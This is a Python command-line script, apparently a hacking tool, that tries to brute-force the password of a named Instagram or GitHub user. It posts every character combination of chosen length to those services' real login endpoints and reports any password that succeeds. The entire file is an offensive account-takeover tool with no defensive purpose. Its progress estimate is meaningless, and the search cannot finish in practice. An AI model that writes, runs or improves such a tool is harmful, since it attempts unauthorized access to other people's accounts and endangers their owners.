import requests
import string
import argparse
import time
from datetime import datetime
from colorama import init, Fore, Style
import sys
import shutil
import math
import itertools

init()

def print_animated(text, color=Fore.RED, delay=0.01):
    for char in text:
        sys.stdout.write(color + char + Style.RESET_ALL)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def generate_passwords(min_length=8, max_length=16):
    chars = string.ascii_letters + string.digits + string.punctuation
    for length in range(min_length, max_length + 1):
        for combination in itertools.product(chars, repeat=length):
            yield ''.join(combination)

def draw_progress_box(attempts, current_password, elapsed_time, estimated_time):
    terminal_width = shutil.get_terminal_size().columns
    box_width = min(terminal_width - 4, 80)
    
    print("╔" + "═" * box_width + "╗")
    
    for attempt in attempts[-5:]:
        print("║ " + attempt.ljust(box_width-2) + " ║")
    
    for _ in range(5 - len(attempts[-5:])):
        print("║" + " " * (box_width-0) + "║")
    
    print("╚" + "═" * box_width + "╝")
    
    bar_width = box_width - 20
    progress = min(elapsed_time / estimated_time, 1) if estimated_time > 0 else 0
    filled = int(bar_width * progress)
    bar = "█" * filled + "░" * (bar_width - filled)
    
    print(f"\nProgress: [{bar}] {progress*100:.1f}%")
    print(f"Elapsed time: {elapsed_time:.1f}s")
    print(f"Estimated time remaining: {max(0, estimated_time - elapsed_time):.1f}s\n")

def crack_instagram(username, min_length=8, max_length=16):
    print_animated("[>] Starting Instagram password crack", Fore.RED)
    print_animated(f"[>] Target username: {username}", Fore.YELLOW)
    print_animated(f"[>] Password length range: {min_length}-{max_length}", Fore.CYAN)
    
    url = "https://www.instagram.com/accounts/login/ajax/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    attempts = []
    start_time = time.time()
    estimated_time = len(string.ascii_letters + string.digits + string.punctuation) * 0.1
    
    for password in generate_passwords(min_length, max_length):
        try:
            data = {
                "username": username,
                "password": password,
                "queryParams": {},
                "optIntoOneTap": "false"
            }
            
            attempts.append(f"Testing: {password}")
            elapsed = time.time() - start_time
            
            print("\033[H\033[J")
            draw_progress_box(attempts, password, elapsed, estimated_time)
            
            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and "authenticated" in response.text:
                if response.json().get("authenticated"):
                    print_animated(f"\n[!] Password found: {password}", Fore.GREEN)
                    return password
                    
            time.sleep(0.1)
            
        except Exception as e:
            print_animated(f"\n[x] Error: {e}", Fore.RED)
            continue
            
    print_animated("\n[x] Password not found", Fore.RED)
    return None

def crack_github(username, min_length=8, max_length=16):
    print_animated("[>] Starting GitHub password crack", Fore.RED)
    print_animated(f"[>] Target username: {username}", Fore.YELLOW)
    print_animated(f"[>] Password length range: {min_length}-{max_length}", Fore.CYAN)
    
    url = "https://github.com/session"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    attempts = []
    start_time = time.time()
    estimated_time = len(string.ascii_letters + string.digits + string.punctuation) * 0.1
    
    for password in generate_passwords(min_length, max_length):
        try:
            data = {
                "login": username,
                "password": password,
                "commit": "Sign in"
            }
            
            attempts.append(f"Testing: {password}")
            elapsed = time.time() - start_time
            
            print("\033[H\033[J")
            draw_progress_box(attempts, password, elapsed, estimated_time)
            
            response = requests.post(url, headers=headers, data=data)
            if response.status_code == 200 and "Incorrect username or password" not in response.text:
                print_animated(f"\n[!] Password found: {password}", Fore.GREEN)
                return password
                
            time.sleep(0.1)
            
        except Exception as e:
            print_animated(f"\n[x] Error: {e}", Fore.RED)
            continue
            
    print_animated("\n[x] Password not found", Fore.RED)
    return None

def main():
    print_animated("""
    ██╗  ██╗██╗██╗    ██╗ █████╗      █████╗ ██╗██████╗ 
    ╚██╗██╔╝██║██║    ██║██╔══██╗    ██╔══██╗██║██╔══██╗
     ╚███╔╝ ██║██║ █╗ ██║███████║    ███████║██║██████╔╝
     ██╔██╗ ██║██║███╗██║██╔══██║    ██╔══██║██║██╔══██╗
    ██╔╝ ██╗██║╚███╔███╔╝██║  ██║    ██║  ██║██║██║  ██║
    ╚═╝  ╚═╝╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
    """, Fore.RED, 0.001)

    parser = argparse.ArgumentParser(description='Password Cracker')
    parser.add_argument('platform', choices=['instagram', 'github'], help='Platform to crack')
    parser.add_argument('username', help='Username to crack')
    parser.add_argument('-m', '--min', type=int, default=8, help='Minimum password length')
    parser.add_argument('-max', '--max', type=int, default=16, help='Maximum password length')
    
    args = parser.parse_args()
    
    start_time = datetime.now()
    print_animated(f"[>] Starting password crack at: {start_time}", Fore.YELLOW)
    
    if args.platform == 'instagram':
        crack_instagram(args.username, args.min, args.max)
    elif args.platform == 'github':
        crack_github(args.username, args.min, args.max)
    
    end_time = datetime.now()
    duration = end_time - start_time
    print_animated(f"\n[>] Cracking completed in: {duration}", Fore.GREEN)

if __name__ == "__main__":
    main()
